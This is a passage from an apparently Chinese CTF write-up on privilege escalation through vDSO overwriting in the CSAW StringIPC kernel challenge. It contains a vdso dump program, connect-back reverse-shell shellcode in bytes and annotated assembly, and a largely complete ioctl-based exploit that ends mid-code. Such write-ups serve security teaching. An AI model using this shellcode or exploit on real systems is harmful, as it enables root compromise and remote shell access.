io_remap_pfn_range(vma,</span><br><span class="line">text_start + image-&gt;sym_hpet_page,</span><br><span class="line">hpet_address &gt;&gt; PAGE_SHIFT,</span><br><span class="line">PAGE_SIZE,</span><br><span class="line">pgprot_noncached(PAGE_READONLY));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> up_fail;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">pvti = pvclock_pvti_cpu0_va();</span><br><span class="line"><span class="keyword">if</span> (pvti &amp;&amp; image-&gt;sym_pvclock_page) &#123;</span><br><span class="line">ret = remap_pfn_range(vma,</span><br><span class="line">      text_start + image-&gt;sym_pvclock_page,</span><br><span class="line">      __pa(pvti) &gt;&gt; PAGE_SHIFT,</span><br><span class="line">      PAGE_SIZE,</span><br><span class="line">      PAGE_READONLY);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> up_fail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">up_fail:</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line">current-&gt;mm-&gt;context.vdso = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">up_write(&amp;mm-&gt;mmap_sem);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当时，在看这里时想到一个问题，既然vdso可以在用户态采用mprotect的方法改为rwx，而且所有用户态用的是一块物理页，为什么在用户态修改vdso不会影响到其他程序呢？最终在如下<a href="http://p4nda.top/WooyunDrops/#!/drops/1059.%E7%AE%80%E5%8D%95%E7%B2%97%E6%9A%B4%E6%9C%89%E6%95%88%E7%9A%84mmap%E4%B8%8Eremap_pfn_range">链接</a>中找到答案。</p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>当了解了上述知识，这种劫持方法就很容易理解了。</p><p>首先，利用内存读找到内存中vdso的逻辑页，由于内核态有写入的权限，因此利用任意写写入shellcode覆盖其中某些函数。</p><p>其次，等待某root进程或者有s权限的进程调用这个函数就可以利用反弹shell完成提权。<br>与上一中方法不同的是，这种方法并不直接提权，而是采用守株待兔的方法，等待其他高权限进程触发，而返回shell。</p><p>如何爆破找到vdso呢？首先根据上文的内核内存图可以确定vdso的范围在0xffffffff80000000~0xffffffffffffefff，而且该映射满足页对齐，并且存在ELF文件结构，且所有内存值都可以知道，如用如下脚本可以dump出vdso，比较坑的是每个版本的vdso函数偏移都不一样：</p><p><strong>dump_vdos.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">if</span> (sysinfo_ehdr!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>;i+=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02x "</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(sysinfo_ehdr+i));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过上述步骤之后，仅需将vdso中gettimeofday函数覆写成仅有root进程提权即可，使用如下shellcode。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">https://gist.github.com/itsZN/1ab36391d1849f15b785</span><br><span class="line">&quot;\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb\x48\x39\xc3\x75\x0f\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x09\x5b\x48\x31\xc0\xb0\x60\x0f\x05\xc3\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x97\x50\x48\xb9\xfd\xff\xf2\xfa\x80\xff\xff\xfe\x48\xf7\xd1\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x07\x48\x31\xc0\xb0\xe7\x0f\x05\x90\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x0f\x05&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nop</span><br><span class="line">push rbx</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al, 0x66</span><br><span class="line">syscall #check uid</span><br><span class="line">xor rbx,rbx</span><br><span class="line">cmp rbx,rax</span><br><span class="line">jne emulate</span><br><span class="line"></span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,0x39</span><br><span class="line">syscall #fork</span><br><span class="line">xor rbx,rbx</span><br><span class="line">cmp rax,rbx</span><br><span class="line">je connectback</span><br><span class="line"></span><br><span class="line">emulate:</span><br><span class="line">pop rbx</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,0x60</span><br><span class="line">syscall</span><br><span class="line">retq</span><br><span class="line"></span><br><span class="line">connectback:</span><br><span class="line">xor rdx,rdx</span><br><span class="line">pushq 0x1</span><br><span class="line">pop rsi</span><br><span class="line">pushq 0x2</span><br><span class="line">pop rdi</span><br><span class="line">pushq 0x29</span><br><span class="line">pop rax </span><br><span class="line">syscall #socket</span><br><span class="line"></span><br><span class="line">xchg rdi,rax</span><br><span class="line">push rax</span><br><span class="line">mov rcx, 0xfeffff80faf2fffd</span><br><span class="line">not rcx</span><br><span class="line">push rcx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">pushq 0x10</span><br><span class="line">pop rdx</span><br><span class="line">pushq 0x2a</span><br><span class="line">pop rax</span><br><span class="line">syscall #connect</span><br><span class="line"></span><br><span class="line">xor rbx,rbx</span><br><span class="line">cmp rax,rbx</span><br><span class="line">je sh</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,0xe7</span><br><span class="line">syscall #exit</span><br><span class="line"></span><br><span class="line">sh:</span><br><span class="line">nop</span><br><span class="line">pushq 0x3</span><br><span class="line">pop rsi</span><br><span class="line">duploop:</span><br><span class="line">pushq 0x21</span><br><span class="line">pop rax</span><br><span class="line">dec rsi</span><br><span class="line">syscall #dup</span><br><span class="line">jne duploop</span><br><span class="line"></span><br><span class="line">mov rbx,0xff978cd091969dd0</span><br><span class="line">not rbx</span><br><span class="line">push rbx</span><br><span class="line">mov rdi,rsp</span><br><span class="line">push rax</span><br><span class="line">push rdi</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor rdx,rdx</span><br><span class="line">mov al,0x3b</span><br><span class="line">syscall #execve</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,0xe7</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><p>根据《Bypassing SMEP Using vDSO Overwrites》一文中提到的利用crontab进程会执行gettimeofday，最终提权的方法，我在QEMU未实现，由于busybox的crontab仅允许root用户设置，并且设置了之后也没有执行(????)，找到了<a href="https://github.com/mncoppola/Linux-Kernel-CTF" target="_blank" rel="noopener">当时比赛部署的方法</a>是用了digitalocean-api而不是QEMU。</p><p>我用一种验证性的方法来测试可行性。以init文件中运行一个循环执行gettimeofday的脚本，来模拟crontab</p><p><strong>sudo_me.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"111"</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">gettimeofday();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>pwn_vdso.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i ;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;((len/<span class="number">8</span>)*<span class="number">8</span>);i+=<span class="number">8</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%lx"</span>,*(<span class="keyword">size_t</span> *)(buf+i) );</span><br><span class="line"><span class="keyword">if</span> (i%<span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_vdso_userspace</span><span class="params">(<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr=<span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">if</span>(addr&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-]cannot get vdso addr"</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = len;i&lt;<span class="number">0x1000</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x "</span>,*(<span class="keyword">char</span> *)(addr+i));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_vsdo_shellcode</span><span class="params">(<span class="keyword">char</span> *shellcode)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr=<span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"vdso:%lx\n"</span>, addr);</span><br><span class="line"><span class="keyword">if</span>(addr&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-]cannot get vdso addr"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (memmem((<span class="keyword">char</span> *)addr,<span class="number">0x1000</span>,shellcode,<span class="built_in">strlen</span>(shellcode) ))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">size_t</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0xffffffff80000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_addr ;</span><br><span class="line"><span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">"\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05"</span>;</span><br><span class="line"><span class="comment">//"\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb\x48\x39\xc3\x75\x0f\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x09\x5b\x48\x31\xc0\xb0\x60\x0f\x05\xc3\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x97\x50\x48\xb9\xfd\xff\xf2\xfa\x80\xff\xff\xfe\x48\xf7\xd1\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x07\x48\x31\xc0\xb0\xe7\x0f\x05\x90\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x0f\x05";</span></span><br><span class="line"><span class="comment">//set target in task_struct</span></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target,<span class="string">"try2findmep4nda"</span>);</span><br><span class="line">prctl(PR_SET_NAME , target);</span><br><span class="line">fd = open(<span class="string">"/dev/csaw"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] open error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_args);</span><br><span class="line"><span class="keyword">if</span> (alloc_args.id == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] alloc_channel error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] now we get a channel %d\n"</span>,alloc_args.id);</span><br><span class="line">shrink_args.id = alloc_args.id;</span><br><span class="line">shrink_args.size = <span class="number">0x100</span>+<span class="number">1</span>;</span><br><span class="line">ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_args);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+] we can read and write any momery"</span>);</span><br><span class="line"><span class="keyword">for</span>(;addr&lt;<span class="number">0xffffffffffffefff</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = addr<span class="number">-0x10</span> ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">read_args.id = alloc_args.id;</span><br><span class="line">read_args.buf = buf;</span><br><span class="line">read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">ioctl(fd,CSAW_READ_CHANNEL,&amp;read_args);</span><br><span class="line"><span class="keyword">if</span>(( !<span class="built_in">strcmp</span>(<span class="string">"gettimeofday"</span>,buf+<span class="number">0x2cd</span>)) )&#123; <span class="comment">// ((*(size_t *)(buf) == 0x00010102464c457f)) &amp;&amp; </span></span><br><span class="line">result = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] found vdso %lx\n"</span>,result);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(result == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"not found , try again "</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">ioctl(fd,CSAW_CLOSE_CHANNEL,&amp;close_args);</span><br><span class="line">seek_args.id =  alloc_args.id;</span><br><span class="line">seek_args.index = result<span class="number">-0x10</span>+<span class="number">0xc80</span> ;</span><br><span class="line">seek_args.whence= SEEK_SET;</span><br><span class="line">ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = shellcode;</span><br><span class="line">write_args.count = <span class="built_in">strlen</span>(shellcode);</span><br><span class="line">ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);</span><br><span class="line"><span class="keyword">if</span>(check_vsdo_shellcode(shellcode)!=<span class="number">0</span>)&#123;</span><br><span class="line"><span 